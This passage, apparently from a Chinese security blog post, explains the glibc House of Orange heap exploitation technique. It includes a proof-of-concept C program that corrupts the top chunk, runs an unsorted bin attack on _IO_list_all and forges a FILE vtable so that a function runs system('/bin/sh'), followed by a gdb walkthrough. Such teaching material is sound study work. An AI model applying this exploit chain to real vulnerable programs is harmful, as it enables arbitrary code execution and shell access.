+ PREV_INUSE 标志（0x20C01）</span></span><br><span class="line">    top = (<span class="type">size_t</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x400</span> - <span class="number">0x10</span>); <span class="comment">// 定位到当前 Top Chunk</span></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>; <span class="comment">// 设置新大小为 0xC00 + PREV_INUSE（满足页对齐要求）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 请求超大内存触发 sysmalloc</span></span><br><span class="line">    <span class="comment">// 这会导致：</span></span><br><span class="line">    <span class="comment">// - 旧堆空间与新申请的内存不连续</span></span><br><span class="line">    <span class="comment">// - 旧 Top Chunk 被放入 unsorted bin</span></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 请求 0x1000 &gt; 0xC01 的内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ┌─────────────────────────────────┐</span></span><br><span class="line">    <span class="comment">// │ 第二阶段：unsorted bin 劫持    │</span></span><br><span class="line">    <span class="comment">// └─────────────────────────────────┘</span></span><br><span class="line">    <span class="comment">// 4. 计算 _IO_list_all 地址</span></span><br><span class="line">    <span class="comment">// 通过 free chunk 的 fd/bk 指针（指向 main_arena）定位</span></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>; <span class="comment">// main_arena 偏移计算</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 构造 unsorted bin 链表</span></span><br><span class="line">    <span class="comment">// 当 malloc 处理 unsorted bin 时：</span></span><br><span class="line">    <span class="comment">// 会将 unsorted_bin-&gt;bk-&gt;fd 写入 _IO_list_all</span></span><br><span class="line">    <span class="comment">// 因此设置：</span></span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>; <span class="comment">// bk 指针指向 _IO_list_all-0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ┌────────────────────────────────────┐</span></span><br><span class="line">    <span class="comment">// │ 第三阶段：伪造 FILE 结构体        │</span></span><br><span class="line">    <span class="comment">// └────────────────────────────────────┘</span></span><br><span class="line">    <span class="comment">// 6. 填充 &quot;/bin/sh&quot; 字符串</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>); <span class="comment">// 作为 system 参数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 设置特殊 size 值触发异常</span></span><br><span class="line">    <span class="comment">// 将 Top Chunk 改为 smallbin-4 的 size（0x61）</span></span><br><span class="line">    <span class="comment">// 触发 malloc 在检查 size 时发现异常（size &lt;= MINSIZE）</span></span><br><span class="line">    <span class="comment">// 进而调用 abort -&gt; _IO_flush_all_lockp</span></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 构造完整的 fake FILE 结构体</span></span><br><span class="line">    FILE *fp = (FILE *)top;</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// _mode &lt;= 0 满足条件</span></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *)<span class="number">2</span>; <span class="comment">// 写指针范围检查</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *)<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9. 设置虚函数表跳转</span></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// 跳转表位置</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>)&amp;winner; <span class="comment">// _IO_OVERFLOW 指向 system</span></span><br><span class="line">    *(<span class="type">size_t</span> *)((<span class="type">size_t</span>)fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>)jump_table; <span class="comment">// 绑定跳转表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ┌──────────────────────────┐</span></span><br><span class="line">    <span class="comment">// │ 触发漏洞执行系统命令    │</span></span><br><span class="line">    <span class="comment">// └──────────────────────────┘</span></span><br><span class="line">    <span class="comment">// 最终调用链：</span></span><br><span class="line">    <span class="comment">// malloc -&gt; malloc_printerr -&gt; abort -&gt; _IO_flush_all_lockp </span></span><br><span class="line">    <span class="comment">// -&gt; _IO_OVERFLOW(fp) -&gt; winner(&quot;/bin/sh&quot;)</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>); <span class="comment">// 触发漏洞</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际执行 shell 的函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(ptr); <span class="comment">// system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译运行：<code>gcc ./house_of_orange.c -O0 -g -no-pie -o a</code></p>
+<p>我们来gdb动调分析一下这个程序</p>
+<p>我们在 43 行下断点（也就是模拟修改 top chunk的部分）</p>
+<p>这是修改前的 top chunk</p>
+<p><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250719141215474.png" alt="image-20250719141215390"></p>
+<p>修改之后</p>
+<p><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250719141304519.png" alt="image-20250719141304459"></p>
+<p>由 0x20C01 改为 0xC01，示例代码中也提到了，这个低三位的 <strong>C01</strong> 很关键，是为了绕过 top chunk 的对齐检查。（取地址的末三位 0x400 , 0x400 + 0xC00 &#x3D; 0x1000满足对其要求）</p>
+<p>继续运行到 <code>malloc</code> 的地方， <code>p2 = malloc(0x1000);</code>，当运行完之后，查看堆信息可以看到原先的 top chunk 已经成功被放入 unsorted bin 中了</p>
+<p><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250719142409632.png" alt="image-20250719142409460"></p>
+<p>至此就完成了 libc 的泄露，下面我们来关注 Unsorted Bin Attack 这个过程</p>
+<p>来到第 62 行代码，<code> top[3] = io_list_all - 0x10; // bk 指针指向 _IO_list_all-0x10</code></p>
+<p><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250719143234598.png" alt="image-20250719143234427"></p>
+<p>最后一步就是伪造 IO_FILE 的布局了。</p>
+<p>_IO_list_all最终会指向 main_arena + 88，对应的 chian 就在 main_arena + 88 + 0x68 ，前面也提到过，这个位置对应的就是 small bin 中0x61 大小的那一条链<code>  top[1] = 0x61;</code></p>
+<p>且在调用虚表中的函数的时候，传入的参数就时对应的 IO 结构的指针，因此我们把前8字节填入 &#x2F;bin&#x2F;sh <code> memcpy((char *)top, &quot;/bin/sh\x00&quot;, 8);</code></p>
+<p>后面就是调用<code>overflow</code>函数检测的绕过了，这个很简单。  																																		<code>    FILE *fp = (FILE *)top;     fp-&gt;_mode = 0; // _mode &lt;= 0 满足条件     fp-&gt;_IO_write_base = (char *)2; // 写指针范围检查     fp-&gt;_IO_write_ptr = (char *)3;</code></p>
+<p>最后执行malloc ，由于 unsorted bin 被破坏了，就会触发abort，从而刷新所有缓冲区，成功执行攻击。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/06/17/unsorterbin%20attack/" rel="prev" title="Unsorted Bin Attack">
+                  <i class="fa fa-angle-left"></i> Unsorted Bin Attack
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fa1lSnow</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
